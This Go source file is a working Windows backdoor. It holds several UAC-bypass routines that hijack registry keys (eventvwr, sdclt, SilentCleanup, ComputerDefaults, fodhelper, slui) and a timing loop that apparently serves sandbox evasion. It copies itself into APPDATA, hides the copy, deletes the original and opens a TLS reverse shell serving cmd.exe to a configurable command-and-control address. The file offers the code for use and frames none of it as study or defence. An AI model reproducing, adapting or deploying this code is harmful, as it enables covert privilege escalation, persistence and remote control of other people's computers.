package main

import (
	"errors"
	"log"
	"os/exec"
	"syscall"
	"time"
	"bytes"
	"os"
	"strconv"
	"strings"
	"fmt"
	"io"
	"crypto/tls"
	"crypto/x509"
	"net"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// GetVer gets the major version of the current installed
// Windows
func GetVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("Version string has wrong format")
	}
	longVer := osStr[tmp1+9 : tmp2]
	majorVerStr := strings.SplitN(longVer, ".", 2)[0]
	majorVerInt, err := strconv.Atoi(majorVerStr)
	if err != nil {
		return 0, errors.New("Version could not be converted to int")
	}
	return majorVerInt, nil
}

// CheckElevate checks whether the current process has administrator
// privileges
func CheckElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

// Uacbypass bypasses User Account Control of Windows and escaletes
// privileges to root if User has root privileges
func Escalate(path string) (err error) {
	log.Println("Path for bypass: (", path, ")")
	version, err := GetVer()
	fmt.Println(version)
	if err != nil {
		return
	}
	if version == 10 {
		if computerdefaults(path) == nil {
			log.Println("computerdefaults")
			return
		}
		if sdcltcontrol(path) == nil {
			log.Println("sdcltcontrol")
			return
		}
		if fodhelper(path) == nil {
			log.Println("fodhelper")
			return
		}
	}
	if version > 9 {
		if silentCleanUp(path) == nil {
			log.Println("silentCleanUp")
			return
		}
		if slui(path) == nil {
			log.Println("slui")
			return
		}
	}
	if version < 10 {
		if eventvwr(path) == nil {
			log.Println("eventvwr")
			return
		}
	}
	return errors.New("uac bypass failed")
}

//// TODO: cleanup Exploits

// eventvwr works on 7, 8, 8.1 fixed in win 10
func eventvwr(path string) (err error) {

	log.Println("eventvwr")
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)
	var cmd = exec.Command("eventvwr.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
	return
}

// sdcltcontrol works on Win 10
func sdcltcontrol(path string) error {

	log.Println("sdcltcontrol")
	var cmd *exec.Cmd

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		return err
	}

	return nil
}

// silentCleanUp works on Win 8.1, 10(patched on some Versions) even on UAC_ALWAYSnotify
func silentCleanUp(path string) (err error) {

	log.Println("silentCleanUp")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	if err != nil {
		return
	}

	err = key.SetStringValue("windir", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)
	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}
	delkey, _ := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	delkey.DeleteValue("windir")
	delkey.Close()
	return
}

// computerdefaults works on Win 10 is more reliable than fodhelper
func computerdefaults(path string) (err error) {
	log.Println("computerdefaults")
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if  err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("cmd", "/C", "start C:\\windows\\system32\\ComputerDefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}

	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// fodhelper works on 10 but computerdefaults is more reliable
func fodhelper(path string) (err error) {
	log.Println("fodhelper")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegeteExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("start fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		return
	}
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// slui works on Win 8.1, 10
func slui(path string) (err error) {
	log.Println("slui")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)

	var cmd = exec.Command("slui.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\`)
	return
}

const rootCert = `-----BEGIN CERTIFICATE-----
MIIB+TCCAZ+gAwIBAgIJAL05LKXo6PrrMAoGCCqGSM49BAMCMFkxCzAJBgNVBAYT
AkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRn
aXRzIFB0eSBMdGQxEjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0xNTEyMDgxNDAxMTNa
Fw0yNTEyMDUxNDAxMTNaMFkxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0
YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQxEjAQBgNVBAMM
CWxvY2FsaG9zdDBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABHGaaHVod0hLOR4d
66xIrtS2TmEmjSFjt+DIEcb6sM9RTKS8TZcdBnEqq8YT7m2sKbV+TEq9Nn7d9pHz
pWG2heWjUDBOMB0GA1UdDgQWBBR0fqrecDJ44D/fiYJiOeBzfoqEijAfBgNVHSME
GDAWgBR0fqrecDJ44D/fiYJiOeBzfoqEijAMBgNVHRMEBTADAQH/MAoGCCqGSM49
BAMCA0gAMEUCIEKzVMF3JqjQjuM2rX7Rx8hancI5KJhwfeKu1xbyR7XaAiEA2UT7
1xOP035EcraRmWPe7tO0LpXgMxlh2VItpc2uc2w=
-----END CERTIFICATE-----
`


func backdoor(){
	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(rootCert))

	if !ok {
		log.Fatal("failed to parse root certificate")
	}
	config := &tls.Config{RootCAs: roots, ServerName: "localhost"}

restart:
	cnc := "127.0.0.1:4444" // change this as you see fit

	connp, err := net.Dial("tcp", cnc)

	wait_count := 0
	for err != nil {
		time.Sleep(2 * time.Second)
		connp,err = net.Dial("tcp", cnc)

		if wait_count > 4{
			goto restart
		}
		wait_count++
	}

	conn := tls.Client(connp,config)

	defer conn.Close()
	for {
		cmd := exec.Command("cmd.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
		rp, wp := io.Pipe()
		
		cmd.Stdin = conn
		cmd.Stdout = wp
		cmd.Stderr = conn
		go io.Copy(conn, rp)
		cmd.Run()
	}
}


func HideFile(filename string) error {
    filenameW, err := syscall.UTF16PtrFromString(filename)
    if err != nil {
        return err
    }

    err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN | syscall.FILE_ATTRIBUTE_SYSTEM)
    if err != nil {
        return err
    }
    return nil
}


func main(){ 
	const MAX_OP = 100000000
	counter := 0

	for i := 0;i < MAX_OP;i++{
		counter += 1
	}

	if counter != MAX_OP {
		return
	}

	pathToStartup := os.Getenv("APPDATA")
	executablePath,_ := os.Executable()
	
	dir := filepath.Dir(executablePath)
	if dir == pathToStartup {

		if CheckElevate() == false {
			if err := Escalate(executablePath);err != nil {
				return
			}
		}else{
			backdoor()
		}
	}else{
		targetPath := pathToStartup+"\\"+filepath.Base(executablePath)
		os.Rename(executablePath,targetPath)
		HideFile(targetPath)
		
		var cmd = exec.Command("cmd", "/C","start "+ targetPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
		cmd.Run()

		cmd = exec.Command("cmd", "/C", "del "+os.Args[0])
		cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
		cmd.Run()
	}
}